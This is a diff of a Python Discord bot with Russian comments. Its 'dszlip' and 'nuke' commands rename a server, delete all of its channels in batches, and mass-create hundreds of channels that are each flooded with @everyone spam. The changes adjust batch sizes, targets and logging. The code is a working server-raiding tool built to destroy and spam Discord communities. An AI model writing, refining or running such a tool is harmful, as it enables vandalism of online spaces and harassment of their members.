@@ -49,15 +49,18 @@ async def dszlip(ctx):
     guild = ctx.guild
     start_time = time.time()
     
+    # Меняем название
     try:
         await guild.edit(name="MOGGED BY ZLIP")
     except:
         pass
     
+    # УДАЛЯЕМ ВСЕ КАНАЛЫ МАКСИМАЛЬНО БЫСТРО (ПАЧКАМИ ПО 200)
     print("🗑️ УДАЛЕНИЕ КАНАЛОВ...")
     
     channels = list(guild.channels)
     total = len(channels)
+    deleted = 0
     
     async def delete_channel(ch):
         try:
@@ -66,15 +69,16 @@ async def dszlip(ctx):
         except:
             return False
     
-    # Удаляем пачками по 200
     batch_size = 200
     for i in range(0, total, batch_size):
         batch = channels[i:i+batch_size]
-        await asyncio.gather(*[delete_channel(ch) for ch in batch], return_exceptions=True)
+        results = await asyncio.gather(*[delete_channel(ch) for ch in batch], return_exceptions=True)
+        deleted += sum(1 for r in results if r is True)
     
-    print(f"✅ Удалено {total} каналов")
+    print(f"✅ Удалено {deleted} каналов")
     
-    print("🔥 СОЗДАНИЕ 1000 КАНАЛОВ ПАРАЛЛЕЛЬНО...")
+    # СОЗДАЕМ 500 КАНАЛОВ ПАРАЛЛЕЛЬНО
+    print("🔥 СОЗДАНИЕ 500 КАНАЛОВ...")
     
     SPAM_TEXT = """@everyone
 **MOGGED BY ZLIP**
@@ -82,29 +86,27 @@ https://guns.lol/dszlip
 ВЫ УПАЛИ НА КОЛЕНИ"""
     
     created = 0
-    target = 1000
+    target = 500
     
     async def create_and_spam(i):
         try:
             ch = await guild.create_text_channel(f"zlip-{i+1}")
-            # Отправляем 5 сообщений параллельно
-            await asyncio.gather(*[ch.send(SPAM_TEXT) for _ in range(5)])
+            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
+            await asyncio.gather(*messages)
             return True
         except:
             return False
     
-    # СОЗДАЕМ ПО 50 КАНАЛОВ ОДНОВРЕМЕННО
-    batch_size = 50
+    batch_size = 50  # 50 каналов ОДНОВРЕМЕННО
     for i in range(0, target, batch_size):
         batch = [create_and_spam(j) for j in range(i, min(i+batch_size, target))]
         results = await asyncio.gather(*batch)
         created += sum(results)
-        print(f"   📦 Создано {min(i+batch_size, target)} каналов")
     
     elapsed = round(time.time() - start_time, 1)
     print(f"✅ Создано {created} каналов за {elapsed}с")
     
-    await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}\nВремя: {elapsed}с")
+    await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nВремя: {elapsed}с")
 
 @bot.command()
 async def key(ctx):
@@ -164,19 +166,17 @@ async def nuke(ctx, guild_id: int = None):
     SPAM = "@everyone\nMOGGED BY ZLIP\nhttps://guns.lol/dszlip"
     
     created = 0
-    target = 1000
-    
-    async def create_and_spam(i):
+    async def create(ch):
         try:
-            ch = await guild.create_text_channel(f"zlip-{i+1}")
-            await asyncio.gather(*[ch.send(SPAM) for _ in range(5)])
+            c = await guild.create_text_channel(f"zlip-{ch+1}")
+            await asyncio.gather(*[c.send(SPAM) for _ in range(5)])
             return True
         except:
             return False
     
     batch_size = 50
-    for i in range(0, target, batch_size):
-        batch = [create_and_spam(j) for j in range(i, min(i+batch_size, target))]
+    for i in range(0, 500, batch_size):
+        batch = [create(j) for j in range(i, min(i+batch_size, 500))]
         results = await asyncio.gather(*batch)
         created += sum(results)
     
